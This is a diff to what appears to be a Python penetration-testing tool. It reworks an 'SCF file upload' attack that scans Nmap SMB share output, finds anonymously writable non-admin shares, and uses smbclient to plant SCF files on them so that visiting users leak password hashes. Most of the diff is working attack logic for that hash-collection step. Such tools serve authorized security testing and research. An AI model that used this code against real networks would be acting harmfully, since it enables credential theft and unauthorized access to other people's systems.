@@ -20,7 +20,7 @@ from libnmap.parser import NmapParser, NmapParserException
 from subprocess import Popen, PIPE, check_output, CalledProcessError
 
 # debug
-from IPython import embed
+#from IPython import embed
 
 # Prevent JTR error in VMWare
 os.environ['CPUID_DISABLE'] = '1'
@@ -110,7 +110,7 @@ def get_share(l, share):
     Gets the share from Nmap output line
     e.g., \\\\192.168.1.10\\Pictures
     '''
-    if l.startswith('  \\\\') and '$' not in l:
+    if l.startswith('  \\\\'):
         share = l.strip()[:-1]
     return share
 
@@ -119,6 +119,7 @@ def parse_nse(hosts, args):
     Parse NSE script output
     '''
     smb_signing_disabled_hosts = []
+    anon_share_found = False
 
     if 'scf' not in args.skip.lower():
         print('\n[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')
@@ -136,7 +137,7 @@ def parse_nse(hosts, args):
             if 'scf' not in args.skip.lower():
                 if script_out['id'] == 'smb-enum-shares':
                     lines = script_out['output'].splitlines()
-                    anon_share_found = write_scf_files(lines, ip, args)
+                    anon_share_found = write_scf_files(lines, ip, args, anon_share_found)
                     local_scf_cleanup()
 
     if 'scf' not in args.skip.lower():
@@ -159,12 +160,11 @@ def run_smbclient(server, share_name, action, scf_filepath):
     stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
     return stdout, stderr
 
-def write_scf_files(lines, ip, args):
+def write_scf_files(lines, ip, args, anon_share_found):
     '''
     Writes SCF files to writeable shares based on Nmap smb-enum-shares output
     '''
     share = None
-    anon_share_found = False
     scf_filepath = create_scf()
 
     for l in lines:
@@ -172,22 +172,30 @@ def write_scf_files(lines, ip, args):
         if share:
             share_folder = share.split('\\')[-1]
             if 'Anonymous access:' in l or 'Current user access:' in l:
-                access = l.split()[-1]
+                access = l.split()[-1].strip()
+
                 if access == 'READ/WRITE':
-                    anon_share_found = True
-                    print('[+] Writeable share found at: '+share)
-                    print('[*] Attempting to write SCF file to share')
-                    action = 'put'
-                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
-                    stdout = stdout.decode('utf-8')
-                    if 'Error:' not in stdout and len(stdout) > 1:
-                        print('[+] Successfully wrote SCF file to: {}'.format(share))
-                        write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
-                    else:
-                        stdout_lines = stdout.splitlines()
-                        for line in stdout_lines:
-                            if 'Error:' in line:
-                                print('[-] Error writing SCF file: \n    '+line.strip())
+                    if '$' not in share:
+                        # We only want to check if a single anon share is found
+                        # for later "no anon shares found" msg
+                        if anon_share_found == False:
+                            anon_share_found = True
+
+                        print('[+] Writeable share found at: '+share)
+                        print('[*] Attempting to write SCF file to share')
+
+                        action = 'put'
+                        stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
+                        stdout = stdout.decode('utf-8')
+
+                        if 'Error:' not in stdout and len(stdout) > 1:
+                            print('[+] Successfully wrote SCF file to: {}'.format(share))
+                            write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
+                        else:
+                            stdout_lines = stdout.splitlines()
+                            for line in stdout_lines:
+                                if 'Error:' in line:
+                                    print('[-] Error writing SCF file: \n    '+line.strip())
     
     return anon_share_found
 
